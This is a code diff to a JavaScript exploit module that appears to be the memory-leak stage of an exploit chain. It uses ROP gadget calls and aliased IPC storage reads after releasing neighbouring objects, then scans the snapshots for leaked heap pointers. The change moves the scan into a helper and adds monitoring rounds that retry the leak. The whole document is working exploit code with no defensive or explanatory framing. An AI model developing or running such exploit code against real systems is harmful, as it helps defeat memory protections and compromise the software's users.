@@ -1,4 +1,4 @@
-import coreRuntime from "../runtime.mjs";
+import coreRuntime, {waitMs} from "../runtime.mjs";
 
 const {
   CachePlan,
@@ -129,6 +129,90 @@ export async function captureReleaseBaseline({
         readError: read0.error, prefixMatches: prefix0Ok};
 }
 
+function scanSnapshotChanges(bufPrev, bufCur, prevEnd, config, primeHex, helpers, roundInfo) {
+    var prefixN = helpers.readHexBytes(bufCur, 16);
+    var prefixNOk = prefixN === primeHex;
+    var curEnd = config.CACHE_READ_SIZE;
+    var lastN = helpers.readHexBytes(
+        bufCur + BigInt(config.CACHE_READ_SIZE - 16), 16);
+    if (lastN === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
+        var lo = config.CONTROL_SIZE, hi = config.CACHE_READ_SIZE;
+        while (lo < hi) {
+            var mid = ((lo + hi) >>> 1) & ~7;
+            if (read64(bufCur + BigInt(mid)) ===
+                0xA5A5A5A5A5A5A5A5n) hi = mid;
+            else lo = mid + 8;
+        }
+        curEnd = lo;
+    }
+
+    var effectiveEnd = Math.min(prevEnd, curEnd);
+    var blockCount = 0, changed = 0, clCount = 0;
+    var candidates = [];
+    for (var off = config.CONTROL_SIZE;
+        off + config.CONTROL_SIZE <= effectiveEnd;
+        off += config.CONTROL_SIZE) {
+        blockCount++;
+        var prevHead = read64(bufPrev + BigInt(off));
+        var curHead = read64(bufCur + BigInt(off));
+        if (prevHead === curHead) continue;
+        changed++;
+
+        var tailMatch = true;
+        for (var t = 8; t < config.CONTROL_SIZE; t += 8) {
+            if (read64(bufPrev + BigInt(off + t)) !==
+                read64(bufCur + BigInt(off + t))) {
+                tailMatch = false;
+                break;
+            }
+        }
+        if (tailMatch) clCount++;
+
+        var cBig = curHead;
+        var isPtr = cBig >= 0x100000000n && cBig < (1n << 39n);
+        var isAligned = isPtr && cBig % 0x4000n === 0n;
+        var low24ok = isPtr && (cBig & 0xFFFFFFn) !== 0n;
+
+        var zeroTail = false;
+        var zeroAfter32 = false;
+        if (isPtr && isAligned && low24ok) {
+            zeroTail = true;
+            for (var zt = 8; zt < 64; zt += 8) {
+                if (read64(bufCur + BigInt(off + zt)) !== 0n) {
+                    zeroTail = false;
+                    break;
+                }
+            }
+            zeroAfter32 = true;
+            for (var za = 32; za < config.CONTROL_SIZE; za += 8) {
+                if (read64(bufCur + BigInt(off + za)) !== 0n) {
+                    zeroAfter32 = false;
+                    break;
+                }
+            }
+        }
+
+        var strength = 0;
+        if (tailMatch && isPtr && isAligned && low24ok)
+            strength = 3;
+        else if (isPtr && isAligned && low24ok && zeroTail)
+            strength = 2;
+        else if (isPtr && isAligned && low24ok && zeroAfter32)
+            strength = 1;
+        if (strength > 0) {
+            candidates.push({
+                offset: off, target: cBig, round: roundInfo.round,
+                previous: prevHead,
+                neighbor: roundInfo.name, changedLink: tailMatch,
+                zeroTail, zeroAfter32, strength
+            });
+        }
+    }
+
+    return {prefixOk: prefixNOk, prefix: prefixN, curEnd, blockCount,
+            changed, clCount, candidates};
+}
+
 export async function releaseNeighborsAndFindPointers({
   config,
   candidateHandle,
@@ -188,102 +272,69 @@ export async function releaseNeighborsAndFindPointers({
                 break;
             }
 
-            var prefixN = helpers.readHexBytes(bufCur, 16);
-            var prefixNOk = prefixN === primeHex;
-            var curEnd = config.CACHE_READ_SIZE;
-            var lastN = helpers.readHexBytes(
-                bufCur + BigInt(config.CACHE_READ_SIZE - 16), 16);
-            if (lastN === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
-                var lo = config.CONTROL_SIZE, hi = config.CACHE_READ_SIZE;
-                while (lo < hi) {
-                    var mid = ((lo + hi) >>> 1) & ~7;
-                    if (read64(bufCur + BigInt(mid)) ===
-                        0xA5A5A5A5A5A5A5A5n) hi = mid;
-                    else lo = mid + 8;
-                }
-                curEnd = lo;
-            }
-
-            var effectiveEnd = Math.min(prevEnd, curEnd);
-            var blockCount = 0, changed = 0, clCount = 0;
-            for (var off = config.CONTROL_SIZE;
-                off + config.CONTROL_SIZE <= effectiveEnd;
-                off += config.CONTROL_SIZE) {
-                blockCount++;
-                var prevHead = read64(bufPrev + BigInt(off));
-                var curHead = read64(bufCur + BigInt(off));
-                if (prevHead === curHead) continue;
-                changed++;
-
-                var tailMatch = true;
-                for (var t = 8; t < config.CONTROL_SIZE; t += 8) {
-                    if (read64(bufPrev + BigInt(off + t)) !==
-                        read64(bufCur + BigInt(off + t))) {
-                        tailMatch = false;
-                        break;
-                    }
-                }
-                if (tailMatch) clCount++;
-
-                // curHead is already the complete little-endian 64-bit word.
-                // The old split read32 pair reconstructed the same value.
-                var cBig = curHead;
-                var isPtr = cBig >= 0x100000000n && cBig < (1n << 39n);
-                var isAligned = isPtr && cBig % 0x4000n === 0n;
-                var low24ok = isPtr && (cBig & 0xFFFFFFn) !== 0n;
-
-                // These queue scans can only affect a candidate after all
-                // three cheap head-shape checks pass. Keep their values
-                // unchanged for every candidate that can be emitted.
-                var zeroTail = false;
-                var zeroAfter32 = false;
-                if (isPtr && isAligned && low24ok) {
-                    zeroTail = true;
-                    for (var zt = 8; zt < 64; zt += 8) {
-                        if (read64(bufCur + BigInt(off + zt)) !== 0n) {
-                            zeroTail = false;
-                            break;
-                        }
-                    }
-                    zeroAfter32 = true;
-                    for (var za = 32; za < config.CONTROL_SIZE; za += 8) {
-                        if (read64(bufCur + BigInt(off + za)) !== 0n) {
-                            zeroAfter32 = false;
-                            break;
-                        }
-                    }
-                }
-
-                var strength = 0;
-                if (tailMatch && isPtr && isAligned && low24ok)
-                    strength = 3;
-                else if (isPtr && isAligned && low24ok && zeroTail)
-                    strength = 2;
-                else if (isPtr && isAligned && low24ok && zeroAfter32)
-                    strength = 1;
-                if (strength > 0) {
-                    pointerCandidates.push({
-                        offset: off, target: cBig, round: ri + 1,
-                        previous: prevHead,
-                        neighbor: nb.name, changedLink: tailMatch,
-                        zeroTail, zeroAfter32, strength
-                    });
-                }
-            }
+            var scan = scanSnapshotChanges(bufPrev, bufCur, prevEnd, config,
+                primeHex, helpers, {round: ri + 1, name: nb.name});
+            for (var ci = 0; ci < scan.candidates.length; ci++)
+                pointerCandidates.push(scan.candidates[ci]);
 
             await log("LEAK release " + (ri + 1) + "/" + neighbors.length +
                 " " + nb.name + ": close=" + hex32(releaseCloseResult) +
-                " read=ok alias=" + (prefixNOk ? "match" : "mismatch") +
-                " prefix=" + prefixN + " data=0x" + curEnd.toString(16) +
-                " compared=" + blockCount + " changed=" + changed +
-                " changedLinks=" + clCount);
-            totalChangedLinks += clCount;
+                " read=ok alias=" + (scan.prefixOk ? "match" : "mismatch") +
+                " prefix=" + scan.prefix + " data=0x" + scan.curEnd.toString(16) +
+                " compared=" + scan.blockCount + " changed=" + scan.changed +
+                " changedLinks=" + scan.clCount);
+            totalChangedLinks += scan.clCount;
             releaseRounds++;
 
             var tmp = bufPrev;
             bufPrev = bufCur;
             bufCur = tmp;
-            prevEnd = curEnd;
+            prevEnd = scan.curEnd;
+        }
+    }
+
+    var monitoringRounds = 0;
+    if (snapshotOk && pointerCandidates.length === 0 &&
+        config.MONITORING_ROUNDS > 0 && releaseRounds > 0) {
+        for (var mi = 0; mi < config.MONITORING_ROUNDS && snapshotOk; mi++) {
+            await waitMs(10);
+
+            call_rop(GADGET_MEMSET, bufCur, 0xA5n,
+                BigInt(config.CACHE_READ_SIZE));
+            var readM = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
+                config.CACHE_READ_SIZE, bufCur);
+
+            if (readM.error !== 0) {
+                stopReason = "monitor-snapshot-read-failed";
+                readError = readM.error;
+                await log("LEAK monitor " + (mi + 1) + "/" +
+                    config.MONITORING_ROUNDS +
+                    ": read failed=" + hex32(readM.error));
+                break;
+            }
+
+            var mscan = scanSnapshotChanges(bufPrev, bufCur, prevEnd, config,
+                primeHex, helpers,
+                {round: releaseRounds + mi + 1, name: "monitor" + mi});
+            for (var mci = 0; mci < mscan.candidates.length; mci++)
+                pointerCandidates.push(mscan.candidates[mci]);
+
+            await log("LEAK monitor " + (mi + 1) + "/" +
+                config.MONITORING_ROUNDS +
+                ": read=ok alias=" + (mscan.prefixOk ? "match" : "mismatch") +
+                " prefix=" + mscan.prefix + " data=0x" +
+                mscan.curEnd.toString(16) +
+                " compared=" + mscan.blockCount + " changed=" + mscan.changed +
+                " changedLinks=" + mscan.clCount);
+            totalChangedLinks += mscan.clCount;
+            monitoringRounds++;
+
+            var mtmp = bufPrev;
+            bufPrev = bufCur;
+            bufCur = mtmp;
+            prevEnd = mscan.curEnd;
+
+            if (pointerCandidates.length > 0) break;
         }
     }
 
@@ -299,7 +350,9 @@ export async function releaseNeighborsAndFindPointers({
         return a.offset - b.offset;
     });
     await log("=== SEQUENTIAL RELEASE: " + releaseRounds +
-        " rounds, " + totalChangedLinks + " changedLinks, " +
+        " rounds" + (monitoringRounds > 0
+            ? " + " + monitoringRounds + " monitor" : "") +
+        ", " + totalChangedLinks + " changedLinks, " +
         pointerCandidates.length + " qualified ===");
     for (var pi = 0; pi < pointerCandidates.length; pi++) {
         var c = pointerCandidates[pi];
@@ -314,7 +367,8 @@ export async function releaseNeighborsAndFindPointers({
     }
 
     return {ok: true, extraStorages, pointerCandidates,
-        releaseRounds, totalChangedLinks, stopReason, readError};
+        releaseRounds, monitoringRounds, totalChangedLinks, stopReason,
+        readError};
 }
 
 export async function qualifyAddressPlan({
